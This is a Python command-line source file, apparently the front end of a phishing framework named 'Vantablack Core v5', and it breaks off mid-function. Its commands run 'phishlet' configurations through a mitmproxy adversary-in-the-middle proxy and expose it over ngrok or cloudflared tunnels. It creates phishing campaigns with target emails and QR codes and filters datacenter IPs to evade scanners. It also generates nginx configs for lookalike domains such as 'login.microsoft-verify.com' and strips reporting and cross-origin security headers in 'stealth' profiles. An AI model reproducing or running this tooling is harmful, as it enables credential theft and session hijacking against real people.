"""
Vantablack Core v5 - CLI (vanta)
================================

Unified Command Line Interface for:
- Campaign Management (setup, run, stop)
- Asset Generation (mutate, analyze)
- System Status (metrics, health)
"""

import click
import asyncio
import logging
from rich.console import Console
from rich.table import Table
from core.mutation.engine import MutationEngine
from core.mutation.scanner import DetectionScanner
from core.common import config
from core.recon.analyzer import get_recon_module
from core.net.tunnel import print_wan_info
import subprocess
import sys
import os
import json
import textwrap
from core.orchestrator.autopilot import Autopilot
from core.common.metrics import MUTATION_OPS, DETECTION_EVENTS
from core.qr_link_system import qr_link_system, QRConfig, QRCorrectionLevel
import requests
import time
import socket
import platform
from core.infrastructure.nginx_generator import NginxConfigGenerator
from core.redirect.antibot import antibot
from core.social.manager import social_manager
from pathlib import Path
from core.net.tunnel import TunnelManager

console = Console()

@click.group()
def cli():
    """Vantablack Core v5 - Red Team Operations Suite"""
    logging.basicConfig(level=logging.INFO)

def _verify_link(url, timeout=5.0):
    """Wrapper pour la nouvelle validation robuste"""
    is_valid, result, details = qr_link_system.validate_url(url, timeout)
    return is_valid, f"{result.value}: {details.get('error', 'No details')}"

def _open_web(url):
    try:
        sysname = platform.system()
        if sysname == "Darwin":
            subprocess.run(["open", url], check=False)
        elif sysname == "Windows":
            subprocess.run(["powershell","-command",f"Start-Process '{url}'"], check=False)
        else:
            subprocess.run(["xdg-open", url], check=False)
        return True
    except Exception:
        return False

@cli.command("verify-link")
@click.option("--url", help="URL à vérifier")
@click.option("--port", default=8888, type=int, help="Port local si URL non fourni")
def verify_link(url, port):
    """Vérifie la disponibilité d’un lien local et/ou distant"""
    targets = []
    if url:
        targets.append(url)
    else:
        targets.append(f"http://localhost:{port}/health")
        targets.append(f"http://127.0.0.1:{port}/health")
    env_url = os.environ.get("VANTA_PUBLIC_URL")
    if env_url:
        targets.append(env_url)
    table = Table(title="Vérification des liens")
    table.add_column("URL")
    table.add_column("OK")
    table.add_column("Détail")
    for u in targets:
        ok, info = _verify_link(u)
        table.add_row(u, "YES" if ok else "NO", str(info))
    console.print(table)

@cli.command("verify-qr")
@click.option("--file", default="safe_qr.png", help="Fichier PNG du QR")
def verify_qr(file):
    """Décodage robuste de QR code avec validation multi-OS et gestion d'erreurs"""
    success, decoded_data = qr_link_system.decode_qr(file)
    
    if success:
        if not decoded_data:
            console.print("[yellow]Aucune donnée QR détectée[/yellow]")
            return
        
        table = Table(title="QR Décodé - Système Robustifié")
        table.add_column("Type")
        table.add_column("Valeur")
        
        for i, data in enumerate(decoded_data, 1):
            table.add_row(f"QR {i}", data)
        
        console.print(table)
        
        # Validation automatique des URLs décodées
        url_count = 0
        for data in decoded_data:
            if data.startswith(('http://', 'https://')):
                url_count += 1
                console.print(f"\n🔗 Validation automatique: {data}")
                is_valid, result, details = qr_link_system.validate_url(data, timeout=3)
                status = "✅" if is_valid else "❌"
                console.print(f"   {status} {result.value}")
        
        if url_count > 0:
            console.print(f"\n📊 Métriques: {qr_link_system.get_metrics()}")
    else:
        # Gestion d'erreur avec guide d'installation
        error_msg = decoded_data[0] if decoded_data else "Erreur inconnue"
        console.print(f"[red]❌ {error_msg}[/red]")
        
        # Guide d'installation spécifique
        install_guide = qr_link_system.get_installation_guide()
        console.print(f"[yellow]📦 Installation requise:[/yellow] {install_guide}")


@cli.command("fuse-qr-link")
@click.option("--url", required=True, help="URL cible à fusionner")
@click.option("--qr-file", default="fused_qr.png", help="Fichier QR de sortie")
@click.option("--validate/--no-validate", default=True, help="Valider le lien avant fusion")
@click.option("--open-browser", is_flag=True, help="Ouvrir le lien après génération")
@click.option("--logo", help="Logo à incruster dans le QR")
def fuse_qr_link(url, qr_file, validate, open_browser, logo):
    """
    🎯 FUSION INTELLIGENTE QR + LIEN
    
    Génère un QR code pour une URL avec validation automatique,
    optimisation et ouverture du lien si demandé.
    """
    console.print(f"[bold magenta]🎯 Fusion QR/Lien: {url}[/bold magenta]")
    
    # Validation robuste du lien
    if validate:
        console.print("🔍 Validation du lien...")
        is_valid, result, details = qr_link_system.validate_url(url)
        
        if not is_valid:
            if result.value == "localhost_only":
                console.print("[yellow]⚠️  Service local non démarré - Génération quand même[/yellow]")
            else:
                console.print(f"[red]❌ Lien invalide: {result.value}[/red]")
                console.print(f"   Détails: {details}")
                if not click.confirm("❓ Continuer malgré l'erreur?"):
                    return
    
    # Génération du QR avec configuration optimisée
    config = QRConfig(
        error_correction=QRCorrectionLevel.HIGH,
        fill_color="#000000",  # Noir professionnel
        back_color="#FFFFFF",  # Blanc pur
        logo_path=logo
    )
    
    result = qr_link_system.generate_qr_with_link_validation(
        url=url,
        output_path=qr_file,
        validate=False,  # Already validated above
        config=config
    )
    
    if result["qr_generated"]:
        console.print(f"[green]✅ QR généré: {qr_file}[/green]")
        
        # Ouverture automatique du lien si demandé
        if open_browser:
            console.print("🌐 Ouverture du lien dans le navigateur...")
            _open_web(url)
        
        # Affichage des informations de fusion
        console.print("\n📋 Résumé de la fusion:")
        console.print(f"   🔗 URL: {url}")
        console.print(f"   📷 QR: {qr_file}")
        console.print(f"   📏 Taille: {os.path.getsize(qr_file)} bytes")
        
        # Test de décodage immédiat pour validation
        console.print("\n🔍 Test de décodage du QR généré...")
        success, decoded = qr_link_system.decode_qr(qr_file)
        if success and decoded:
            console.print(f"   ✅ Décodage réussi: {decoded[0]}")
        else:
            console.print("   ⚠️  Décodage échoué - Vérifier les dépendances")
    
    else:
        console.print(f"[red]❌ Erreur lors de la fusion: {result.get('error', 'Unknown')}[/red]")
        
        # Guide d'installation si nécessaire
        if any(x in str(result.get('error', '')).lower() for x in ['dépendance', 'install', 'missing']):
            console.print(f"[yellow]📦 {qr_link_system.get_installation_guide()}[/yellow]")

@cli.command("menu")
def menu():
    """
    🎯 MENU INTERACTIF AVANCÉ - Vantablack Core
    
    Interface unifiée pour toutes les opérations QR/liens avec validation robuste,
    métriques de performance et gestion d'erreurs professionnelle.
    """
    
    # En-tête avec informations système
    console.print("")
    console.print("[bold magenta]🎯 VANTABLACK - MENU PRINCIPAL[/bold magenta]")
    console.print("[dim]Système QR/Liens Robustifié v2.0 | Multi-OS | Métriques Temps Réel[/dim]")
    
    while True:
        console.print("\n" + "="*60)
        console.print("[bold]📋 MENU PRINCIPAL[/bold]")
        console.print("="*60)
        
        # Section Génération
        console.print("[bold blue]🚀 GÉNÉRATION[/bold blue]")
        console.print("1) Générer lien local (copie presse-papiers)")
        console.print("2) Générer QR code (options avancées)")
        console.print("3) Fusion intelligente QR + lien (recommandé)")
        
        # Section Validation
        console.print("[bold green]🔍 VALIDATION[/bold green]")
        console.print("4) Vérifier lien (local + distant + SSL)")
        console.print("5) Vérifier QR code (décodage + validation)")
        console.print("6) Diagnostic complet environnement")
        
        # Section Utilitaire
        console.print("[bold yellow]⚙️  UTILITAIRES[/bold yellow]")
        console.print("7) Ouvrir interface web")
        console.print("7b) Démarrer tunnel WAN + QR")
        console.print("8) Voir métriques de performance")
        console.print("9) Guide d'installation multi-OS")
        console.print("10) Mode diagnostic avancé")
        
        # Section Système
        console.print("[bold red]🔧 SYSTÈME[/bold red]")
        console.print("11) Vérifier compatibilité OS")
        console.print("12) Test réseau et connectivité")
        
        # Section Avancé (New)
        console.print("[bold cyan]🔥 PHASE 4 (Avancé)[/bold cyan]")
        console.print("13) Gestion AntiBot (Blacklist/Logs)")
        console.print("14) Générer configuration Nginx (Tier 2)")
        console.print("15) Créer une campagne (Wizard + Slugs)")
        console.print("16) Lister les campagnes actives")
        
        console.print("0) Quitter")
        
        console.print("\n[dim]💡 Utilisez 'fuse-qr-link' pour la fusion intelligente recommandée[/dim]")
        
        choice = input("\n🎯 Sélection (0-16): ").strip()
        
        if choice == "0":
            console.print("[green]👋 Au revoir![/green]")
            break
            
        elif choice == "1":
            # Génération lien local améliorée
            port = input("🔢 Port local (défaut 8888): ").strip() or "8888"
            url = f"http://localhost:{port}/"
            
            # Validation du service local
            console.print(f"🔍 Validation de {url}...")
            is_valid, result, details = qr_link_system.validate_url(url, timeout=2)
            
            if is_valid:
                console.print(f"[green]✅ Service local actif: {url}[/green]")
            else:
                console.print(f"[yellow]⚠️  Service local non démarré: {result.value}[/yellow]")
            
            console.print(f"[bold]🔗 Lien généré:[/bold] {url}")
            
            # Copie presse-papiers multi-OS
            try:
                import shutil
                if platform.system() == "Darwin" and shutil.which("pbcopy"):
                    subprocess.run("pbcopy", input=url.encode(), check=False)
                    console.print("[cyan]📋 Copié dans le presse‑papiers (macOS)[/cyan]")
                elif platform.system() == "Linux" and shutil.which("xclip"):
                    subprocess.run(["xclip", "-selection", "clipboard"], input=url.encode(), check=False)
                    console.print("[cyan]📋 Copié dans le presse‑papiers (Linux)[/cyan]")
                elif platform.system() == "Windows":
                    import pyperclip
                    pyperclip.copy(url)
                    console.print("[cyan]📋 Copié dans le presse‑papiers (Windows)[/cyan]")
                else:
                    console.print("[yellow]ℹ️  Presse-papiers non disponible - Copiez manuellement[/yellow]")
            except Exception as e:
                console.print(f"[yellow]⚠️  Presse-papiers indisponible: {e}[/yellow]")
        
        elif choice == "2":
            # Génération QR avec options avancées
            console.print("[bold]🎨 GÉNÉRATION QR AVANCÉE[/bold]")
            
            url = input("🔗 URL cible (vide pour localhost:8888): ").strip()
            if not url:
                port = input("🔢 Port local (défaut 8888): ").strip() or "8888"
                url = f"http://localhost:{port}/"
            
            out = input("💾 Fichier sortie (safe_qr.png): ").strip() or "safe_qr.png"
            logo = input("🖼️  Logo PNG optionnel: ").strip() or None
            
            # Options avancées
            console.print("\n[bold]🎯 OPTIONS AVANCÉES[/bold]")
            error_corr = input("📊 Niveau correction [L/M/Q/H] (défaut H): ").strip().upper() or "H"
            color = input("🎨 Couleur QR (défaut black): ").strip() or "black"
            bg_color = input("🏳️  Couleur fond (défaut white): ").strip() or "white"
            
            # Appel avec toutes les options
            safe_qr(
                url=url if url != "None" else None,
                port=8888,
                out=out,
                logo=logo if logo != "None" else None,
                validate=True,
                error_correction=error_corr if error_corr in ['L', 'M', 'Q', 'H'] else 'H',
                color=color,
                bg_color=bg_color
            )
        
        elif choice == "3":
            # Fusion intelligente QR + lien (recommandée)
            console.print("[bold]🎯 FUSION INTELLIGENTE QR/LIEN[/bold]")
            
            url = input("🔗 URL cible (obligatoire): ").strip()
            if not url:
                console.print("[red]❌ URL obligatoire pour la fusion[/red]")
                continue
            
            qr_file = input("💾 Fichier QR (fused_qr.png): ").strip() or "fused_qr.png"
            logo = input("🖼️  Logo optionnel: ").strip() or None
            
            # Validation automatique
            validate = input("🔍 Valider le lien? [O/n]: ").strip().lower() != 'n'
            open_browser = input("🌐 Ouvrir dans le navigateur? [o/N]: ").strip().lower() == 'o'
            
            # Appel de la fusion intelligente
            fuse_qr_link(
                url=url,
                qr_file=qr_file,
                validate=validate,
                open_browser=open_browser,
                logo=logo if logo != "None" else None
            )
        
        elif choice == "4":
            # Validation de lien robuste
            console.print("[bold]🔗 VALIDATION DE LIEN ROBUSTE[/bold]")
            
            url = input("🔗 URL à valider (vide pour options): ").strip()
            if not url:
                # Options de validation
                console.print("\n[bold]🎯 OPTIONS DE VALIDATION[/bold]")
                print("1) Service local (localhost:8888)")
                print("2) Service distant (VANTA_PUBLIC_URL)")
                print("3) URL personnalisée")
                
                opt = input("🔢 Choix (1-3): ").strip()
                
                if opt == "1":
                    port = input("🔢 Port local: ").strip() or "8888"
                    url = f"http://localhost:{port}/health"
                elif opt == "2":
                    url = os.environ.get("VANTA_PUBLIC_URL")
                    if not url:
                        console.print("[red]❌ VANTA_PUBLIC_URL non configuré[/red]")
                        continue
                elif opt == "3":
                    url = input("🔗 URL personnalisée: ").strip()
                else:
                    console.print("[yellow]⚠️  Option invalide[/yellow]")
                    continue
            
            if url:
                verify_link(url=url, port=8888)
        
        elif choice == "5":
            # Vérification QR améliorée
            file = input("📷 Fichier QR à vérifier (safe_qr.png): ").strip() or "safe_qr.png"
            verify_qr(file=file)
        
        elif choice == "6":
            # Diagnostic complet
            doctor()
        
        elif choice == "7":
            # Ouverture interface web (autostart si nécessaire)
            port = input("🌐 Port de l'interface web (défaut 8080): ").strip() or "8080"
            url = f"http://localhost:{port}/ui"
            is_valid, result, details = qr_link_system.validate_url(url, timeout=1.5)
            if not is_valid:
                console.print("[yellow]⚠️  UI non détectée, lancement du serveur...[/yellow]")
                try:
                    ui.callback(int(port))  # type: ignore
                    time.sleep(1.0)
                except Exception as e:
                    console.print(f"[red]Démarrage UI échoué: {e}[/red]")
            console.print(f"[green]🌐 Ouverture de {url}[/green]")
            _open_web(url)
        elif choice.lower() == "7b":
            port = input("🔢 Port (défaut 8080): ").strip() or "8080"
            provider = input("☁️  Provider (cloudflared/ngrok/localhost.run) [cloudflared]: ").strip() or "cloudflared"
            qr_file = input("💾 Fichier QR (wan_qr.png): ").strip() or "wan_qr.png"
            console.print(f"[yellow]Initialisation du tunnel WAN ({provider})...[/yellow]")
            try:
                tm = TunnelManager(port=int(port), provider=provider)
                public_url = asyncio.run(tm.start())
                console.print(f"[green]Tunnel actif:[/green] {public_url}")
                is_valid, result, details = qr_link_system.validate_url(public_url, timeout=5)
                status = "✅" if is_valid else f"⚠️ {result.value}"
                console.print(f"   Vérification WAN: {status}")
                res = qr_link_system.generate_qr_with_link_validation(
                    url=public_url, output_path=qr_file, validate=False
                )
                if res.get("qr_generated"):
                    console.print(f"[green]QR WAN généré:[/green] {qr_file}")
                else:
                    console.print(f"[yellow]QR non généré:[/yellow] {res.get('error')}")
            except Exception as e:
                console.print(f"[red]Tunnel error:[/red] {e}")
        
        elif choice == "8":
            # Métriques de performance
            metrics = qr_link_system.get_metrics()
            console.print("[bold]📊 MÉTRIQUES DE PERFORMANCE[/bold]")
            console.print(f"   Total validations: {metrics['total_checks']}")
            console.print(f"   Succès: {metrics['successful_checks']}")
            console.print(f"   Échecs: {metrics['failed_checks']}")
            console.print(f"   Erreurs SSL: {metrics['ssl_errors']}")
            console.print(f"   Erreurs réseau: {metrics['network_errors']}")
            console.print(f"   Temps réponse moyen: {metrics['average_response_time']:.2f}s")
        
        elif choice == "9":
            # Guide d'installation multi-OS
            console.print("[bold]📦 GUIDE D'INSTALLATION MULTI-OS[/bold]")
            guide = qr_link_system.get_installation_guide()
            console.print(f"   {guide}")
            
            # Détails supplémentaires par OS
            sysname = platform.system()
            if sysname == "Darwin":
                console.print("   💡 macOS: 'brew update && brew upgrade' recommandé")
            elif sysname == "Linux":
                console.print("   💡 Linux: 'sudo apt update && sudo apt upgrade' recommandé")
            elif sysname == "Windows":
                console.print("   💡 Windows: Vérifier Python dans PATH")
        
        elif choice == "10":
            # Mode diagnostic avancé
            console.print("[bold]🔧 DIAGNOSTIC AVANCÉ[/bold]")
            
            table = Table(title="Diagnostic Système Complet")
            table.add_column("Test")
            table.add_column("Résultat")
            table.add_column("Détails")
            
            # Test DNS
            try:
                s = socket.socket()
                s.settimeout(3.0)
                s.connect(("1.1.1.1", 53))
                table.add_row("DNS", "✅ OK", "Connectivité Internet")
            except Exception as e:
                table.add_row("DNS", "❌ FAIL", f"{e}")
            finally:
                try:
                    s.close()
                except Exception:
                    pass
            
            # Test services locaux
            services = ["http://localhost:8080/health", "http://localhost:8888/", "http://127.0.0.1:8080"]
            for service in services:
                is_valid, result, details = qr_link_system.validate_url(service, timeout=2)
                status = "✅" if is_valid else "❌"
                table.add_row(f"Service {service}", status, result.value)
            
            console.print(table)
        
        elif choice == "11":
            # Compatibilité OS
            sysname = platform.system()
            console.print(f"[bold]💻 COMPATIBILITÉ OS: {sysname}[/bold]")
            
            if sysname == "Darwin":
                console.print("   ✅ macOS compatible")
                console.print("   📋 Python 3.11+, Homebrew, venv .venv")
                console.print("   🔧 Commandes: brew install zbar, pip install qrcode[pil]")
            elif sysname == "Linux":
                console.print("   ✅ Linux compatible")
                console.print("   📋 python3.11, python3.11-venv, libzbar0")
                console.print("   🔧 Commandes: sudo apt install libzbar0")
            elif sysname == "Windows":
                console.print("   ✅ Windows compatible")
                console.print("   📋 Python officiel, PowerShell")
                console.print("   🔧 Commandes: pip install pyzbar qrcode[pil]")
            else:
                console.print("   ⚠️  Système non standard - Compatibilité limitée")
        
        elif choice == "12":
            # Test réseau complet
            console.print("[bold]🌐 TEST RÉSEAU COMPLET[/bold]")
            
            targets = [
                ("Google", "https://www.google.com"),
                ("Cloudflare DNS", "https://1.1.1.1"),
                ("Localhost", "http://localhost:8080"),
                ("Vanta Public", os.environ.get("VANTA_PUBLIC_URL", "https://httpbin.org/status/200"))
            ]
            
            table = Table(title="Test de Connectivité")
            table.add_column("Cible")
            table.add_column("Statut")
            table.add_column("Temps")
            table.add_column("SSL")
            
            for name, url in targets:
                if url:
                    start_time = time.time()
                    is_valid, result, details = qr_link_system.validate_url(url, timeout=5)
                    response_time = time.time() - start_time
                    
                    status = "✅" if is_valid else "❌"
                    ssl_ok = "✅" if details.get("ssl_valid", False) else "❌"
                    
                    table.add_row(name, status, f"{response_time:.2f}s", ssl_ok)
            
            console.print(table)
        
        elif choice == "13":
            console.print("[bold red]🛡️ GESTION ANTIBOT[/bold red]")
            console.print(f"Règles Datacenter chargées: {len(antibot.datacenter_networks)}")
            # Simple interaction
            sub = input("1) Recharger listes | 2) Tester une IP : ").strip()
            if sub == "1":
                antibot.load_blacklist("core/config/datacenter_cidrs.txt")
                antibot.load_blacklist("core/config/blacklist_ips.txt")
                console.print("[green]✅ Listes rechargées[/green]")
            elif sub == "2":
                ip = input("IP à tester: ").strip()
                is_dc = antibot.is_datacenter_ip(ip)
                console.print(f"IP {ip} est Datacenter: {is_dc}")

        elif choice == "14":
            console.print("[bold blue]🔧 GÉNÉRATEUR NGINX[/bold blue]")
            domain = input("Domaine (ex: login.microsoft-verify.com): ").strip()
            upstream = input("Upstream URL (ex: http://127.0.0.1:8001): ").strip() or "http://127.0.0.1:8001"
            ssl_cert = input("Chemin SSL Cert (Entrée pour sans SSL): ").strip()
            ssl_key = input("Chemin SSL Key (Entrée pour sans SSL): ").strip()
            
            generator = NginxConfigGenerator(
                domain_name=domain,
                upstream_url=upstream,
                ssl_cert=ssl_cert if ssl_cert else None,
                ssl_key=ssl_key if ssl_key else None
            )
            config_content = generator.generate_config()
            filename = f"nginx_{domain.replace('.', '_')}.conf"
            with open(filename, "w") as f:
                f.write(config_content)
            console.print(f"[green]✅ Configuration générée: {filename}[/green]")

        elif choice == "15":
            console.print("[bold magenta]🎭 WIZARD CAMPAGNE[/bold magenta]")
            name = input("Nom de la campagne: ").strip()
            
            templates = social_manager.list_templates()
            console.print("Templates disponibles:")
            for t in templates:
                console.print(f" - {t['id']}: {t['name']}")
            
            tid = input("ID Template: ").strip()
            email = input("Email cible (optionnel): ").strip()
            
            console.print("\n[bold cyan]🔗 PERSONNALISATION DU LIEN[/bold cyan]")
            slug = input("Slug personnalisé (laisser vide pour UUID): ").strip()
            
            try:
                camp = social_manager.create_campaign(
                    name=name,
                    template_id=tid,
                    target_email=email if email else None,
                    custom_slug=slug if slug else None
                )
                console.print("[green]✅ Campagne créée avec succès![/green]")
                console.print(f"🔗 URL: {camp['redirect_url']}")
                console.print(f"📷 QR: {camp['qr_code_path']}")
            except Exception as e:
                console.print(f"[red]❌ Erreur: {e}[/red]")

        elif choice == "16":
            console.print("[bold cyan]📋 CAMPAGNES ACTIVES[/bold cyan]")
            campaigns = social_manager.list_campaigns()
            if not campaigns:
                console.print("[yellow]⚠️  Aucune campagne active trouvée[/yellow]")
            else:
                table = Table(title="Campagnes Actives")
                table.add_column("ID", style="cyan")
                table.add_column("Nom", style="bold")
                table.add_column("Template", style="green")
                table.add_column("Clicks", style="magenta")
                table.add_column("URL", style="blue")
                
                for c in campaigns:
                    metrics = c.get("metrics", {})
                    table.add_row(
                        c.get("id", "?"),
                        c.get("name", "Sans nom"),
                        c.get("template_id", "?"),
                        str(metrics.get("clicks", 0)),
                        c.get("redirect_url", "?")
                    )
                console.print(table)

        else:
            console.print("[yellow]⚠️  Choix invalide - Sélectionnez 0-16[/yellow]")
            
        # Pause avant de revenir au menu
        input("\n↵ Presser Entrée pour continuer...")

@cli.command()
def init():
    """Interactive environment initialization"""
    console.print("[cyan]Initializing environment[/cyan]")
    db_url = click.prompt("DB_URL", default=config.get("DB_URL"))
    smtp_host = click.prompt("SMTP_HOST", default=config.get("SMTP_HOST"))
    smtp_port = click.prompt("SMTP_PORT", default=config.get("SMTP_PORT"))
    smtp_user = click.prompt("SMTP_USER", default=config.get("SMTP_USER"))
    smtp_pass = click.prompt("SMTP_PASS", default=config.get("SMTP_PASS"), hide_input=True)
    edge_enabled = click.prompt("EDGE_ENABLED [true/false]", default=config.get("EDGE_ENABLED"))
    env_path = ".env"
    with open(env_path, "w") as f:
        f.write(f"DB_URL={db_url}\n")
        f.write(f"SMTP_HOST={smtp_host}\n")
        f.write(f"SMTP_PORT={smtp_port}\n")
        f.write(f"SMTP_USER={smtp_user}\n")
        f.write(f"SMTP_PASS={smtp_pass}\n")
        f.write(f"EDGE_ENABLED={edge_enabled}\n")
    console.print(f"[green]Written {env_path}[/green]")

@cli.command()
def doctor():
    """Environment diagnostics"""
    table = Table(title="Environment Check")
    table.add_column("Item")
    table.add_column("Status")
    try:
        import fastapi  # noqa
        table.add_row("fastapi", "OK")
    except Exception:
        table.add_row("fastapi", "MISSING")
    try:
        import mitmproxy  # noqa
        table.add_row("mitmproxy", "OK")
    except Exception:
        table.add_row("mitmproxy", "OPTIONAL")
    try:
        import aiosmtplib  # noqa
        table.add_row("aiosmtplib", "OK")
    except Exception:
        table.add_row("aiosmtplib", "MISSING")
    cfg = config.sanitized()
    table.add_row("DB_URL", cfg.get("DB_URL"))
    table.add_row("SMTP_HOST", cfg.get("SMTP_HOST"))
    console.print(table)

@cli.command("phishlets-validate")
def phishlets_validate():
    """Valide tous les phishlets et affiche un résumé"""
    try:
        from core.edge.phishlets import PhishletLoader
        import glob
        loader = PhishletLoader()
        ok = 0
        files = glob.glob("phishlets/*.yaml")
        for p in files:
            with open(p, "r") as f:
                y = f.read()
            cfg = loader.load_from_yaml(y)
            console.print(f"[green]OK[/green] {p} → {cfg.name} ({len(cfg.proxy_hosts)} hosts)")
            ok += 1
        console.print(f"[bold]{ok} phishlet(s) valides[/bold]")
    except Exception as e:
        console.print(f"[red]Erreur: {e}[/red]")

@cli.command()
@click.option("--port", default=8000)
def demo(port):
    """Run demo API with metrics and guide"""
    app_code = (
        "from fastapi import FastAPI\n"
        "from core.api.routes import router\n"
        "from core.web.server import create_app\n"
        "app = create_app()\n"
        "app.include_router(router)\n"
    )
    path = ".v5_demo_app.py"
    with open(path, "w") as f:
        f.write(app_code)
    console.print("[yellow]Starting demo server[/yellow]")
    subprocess.run([sys.executable, "-m", "uvicorn", ".v5_demo_app:app", "--port", str(port)], check=False)


@cli.command("test")
def run_tests():
    """Exécute la suite de tests de base (API + UI)"""
    console.print("[yellow]Exécution des tests (pytest requis)...[/yellow]")
    try:
        import pytest  # noqa: F401
    except Exception:
        console.print("[red]pytest introuvable[/red]")
        console.print("Installez les dépendances puis relancez:")
        console.print("  python -m pip install -r requirements.txt")
        console.print("  python -m pytest -q")
        return
    try:
        import subprocess as sp
        sp.run([sys.executable, "-m", "pytest", "-q"], check=False)
    except Exception as e:
        console.print(f"[red]Erreur lors des tests:[/red] {e}")

@cli.command("edge-demo")
@click.option("--phishlet", default="phishlets/example.yaml")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8443, type=int)
def edge_demo(phishlet, host, port):
    """Run Edge Proxy demo if mitmproxy is available"""
    try:
        from core.edge.proxy import EdgeProxy, EdgeConfig
        import asyncio
        cfg = EdgeConfig(listen_host=host, listen_port=port)
        proxy = EdgeProxy(cfg)
        console.print(f"[yellow]Starting Edge demo on {host}:{port}[/yellow]")
        with open(phishlet, "r") as f:
            ph_yaml = f.read()
        asyncio.run(proxy.start(ph_yaml))
    except Exception as e:
        console.print(f"[red]Edge demo unavailable: {e}[/red]")
        console.print("[blue]Install optional dependency: mitmproxy[/blue]")

@cli.command("edge-preset")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8443, type=int)
def edge_preset(host, port):
    """Run Edge Proxy with preset demo mapping"""
    try:
        from core.edge.proxy import EdgeProxy, EdgeConfig
        import asyncio
        cfg = EdgeConfig(listen_host=host, listen_port=port)
        proxy = EdgeProxy(cfg)
        console.print(f"[yellow]Starting Edge preset on {host}:{port}[/yellow]")
        with open("phishlets/preset_demo.yaml", "r") as f:
            ph_yaml = f.read()
        asyncio.run(proxy.start(ph_yaml))
    except Exception as e:
        console.print(f"[red]Edge preset unavailable: {e}[/red]")
        console.print("[blue]Install optional dependency: mitmproxy[/blue]")

@cli.command("edge-run")
@click.option("--name", help="Nom du phishlet dans ./phishlets (sans .yaml)")
@click.option("--path", help="Chemin vers un phishlet YAML")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8443, type=int)
@click.option("--tunnel", help="Créer un tunnel WAN (ngrok|cloudflared|localhost.run)", required=False)
@click.option("--upstream", help="Proxy HTTP amont ex: http://user:pass@host:3128")
@click.option("--rate", type=int, help="Limite de requêtes par minute par IP")
@click.option("--allow-ips", help="Liste CSV d'IPs autorisées")
@click.option("--deny-ips", help="Liste CSV d'IPs refusées")
@click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
@click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
@click.option("--profile", default="default", help="Profil (default|stealth|strict|perf|parano)")
def edge_run(name, path, host, port, tunnel, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
    try:
        from core.edge.proxy import EdgeProxy, EdgeConfig
        import asyncio
        import yaml
        if not path and name:
            path = os.path.join("phishlets", f"{name}.yaml")
        if not path:
            console.print("[red]Spécifie --name ou --path[/red]")
            return
        with open(path, "r") as f:
            ph_yaml = f.read()
        # Appliquer profil
        p = (profile or "default").lower()
        _profile_http2 = None
        if p == "stealth":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                # Blocklist agressive
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": "analytics|gtm|/metrics|/collect", "mimes": ["text/javascript","application/javascript"], "max_kb": 512},
                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 256},
                    {"pattern": "/video|/media", "mimes": ["video/"], "max_kb": 1024},
                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 300},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                # En-têtes: retirer NEL/Report-To si présents
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                # Réseau par défaut stealth si non surchargé
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "60"
            except Exception as e:
                console.print(f"[yellow]Profil stealth non appliqué: {e}[/yellow]")
        elif p == "strict":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 256},
                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 160},
                    {"pattern": "/video|/media|/stream", "mimes": ["video/"], "max_kb": 400},
                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 150},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                # En-têtes à retirer
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
                    {"action": "remove", "name": "Permissions-Policy"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                # HTTP/2 off et limite plus basse
                _profile_http2 = False
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "40"
            except Exception as e:
                console.print(f"[yellow]Profil strict non appliqué: {e}[/yellow]")
        elif p == "perf":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": "analytics|gtm", "mimes": ["text/javascript","application/javascript"], "max_kb": 1024},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
                    {"action": "remove", "name": "Report-To"},
                ])
                data["headers"] = hdrs
                ph_yaml = yaml.safe_dump(data, sort_keys=False)
                if rate is None:
                    os.environ["RATE_LIMIT_PER_MINUTE"] = "100"
            except Exception as e:
                console.print(f"[yellow]Profil perf non appliqué: {e}[/yellow]")
        elif p == "parano":
            try:
                data = yaml.safe_load(ph_yaml)
                if not isinstance(data, dict):
                    raise ValueError("phishlet YAML invalide")
                bl = data.get("blocklist") or []
                extra_bl = [
                    {"pattern": ".*", "mimes": ["video/"], "max_kb": 1},
                    {"pattern": ".*", "mimes": ["image/"], "max_kb": 120},
                    {"pattern": "fonts?|woff2|ttf", "mimes": ["font/"], "max_kb": 120},
                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 180},
                ]
                bl.extend(extra_bl)
                data["blocklist"] = bl
                hdrs = data.get("headers") or []
                hdrs.extend([
                    {"action": "remove", "name": "NEL"},
